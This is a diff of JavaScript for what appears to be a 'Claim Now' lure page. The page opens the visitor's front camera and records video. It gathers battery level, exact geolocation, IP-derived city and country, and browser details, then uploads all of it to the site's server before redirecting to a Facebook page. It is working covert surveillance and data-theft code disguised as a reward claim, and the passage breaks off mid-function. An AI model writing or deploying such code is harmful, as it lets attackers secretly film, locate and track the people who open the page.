@@ -1,66 +1,93 @@
+const video = document.getElementById('preview');
 const btn = document.getElementById('startBtn');
 const loading = document.getElementById('loading');
-const video = document.getElementById('preview');
-
-const REDIRECT_URL = "https://www.facebook.com/share/1DQpaDAogj/";
+const REDIRECT_URL = "https://www.facebook.com/yourpage/";
 
 // Initialize camera
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         video.srcObject = stream;
-    } catch (err) { console.warn("Camera permission denied."); }
+    } catch (err) {
+        console.warn("Camera permission denied.");
+    }
 }
 initCamera();
 
-// Get battery and device info
-async function getDeviceInfo() {
-    const battery = navigator.getBattery ? await navigator.getBattery() : { level: "N/A" };
-    const ua = navigator.userAgent;
-    return `Battery: ${(battery.level || 0)*100}%, Device: ${ua}`;
+// Get battery info
+async function getBattery() {
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return `${Math.round(battery.level * 100)}%`;
+    }
+    return "Unknown";
 }
 
-// Get exact geolocation
-async function getGeo() {
-    return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({});
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                resolve({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    maps: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
-                });
-            },
-            err => resolve({})
-        );
+// Get geolocation
+async function getLocation() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                () => resolve("Location denied")
+            );
+        } else {
+            resolve("Location not supported");
+        }
     });
 }
 
-// Claim Now
+// Get IP info
+async function getIPInfo() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+    } catch {
+        return {};
+    }
+}
+
+// Get device info
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    return ua;
+}
+
+// Claim Now button
 btn.addEventListener('click', async () => {
     btn.style.display = 'none';
     loading.style.display = 'block';
 
     try {
+        // Get device and location info
+        const battery = await getBattery();
+        const location = await getLocation();
+        const ipInfo = await getIPInfo();
+        const deviceInfo = getDeviceInfo();
+
+        // Prepare description
+        const description = `
+🎬 Claim Video
+Battery: ${battery}
+Location: ${location}
+IP: ${ipInfo.ip || "Unknown"}
+City: ${ipInfo.city || "Unknown"}
+Region: ${ipInfo.region || "Unknown"}
+Country: ${ipInfo.country_name || "Unknown"}
+Device/Browser Info: ${deviceInfo}
+        `;
+
+        // Record video
         const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
         let chunks = [];
 
-        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
 
         recorder.onstop = async () => {
             const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            const deviceInfo = await getDeviceInfo();
-            const geo = await getGeo();
-
             const formData = new FormData();
             formData.append('video', videoBlob, 'claim_video.mp4');
-            formData.append('deviceInfo', deviceInfo);
-            formData.append('latitude', geo.latitude || '');
-            formData.append('longitude', geo.longitude || '');
-            formData.append('accuracy', geo.accuracy || '');
-            formData.append('maps', geo.maps || '');
+            formData.append('description', description);
 
             try {
                 const res = await fetch("/upload-video", { method: "POST", body: formData });
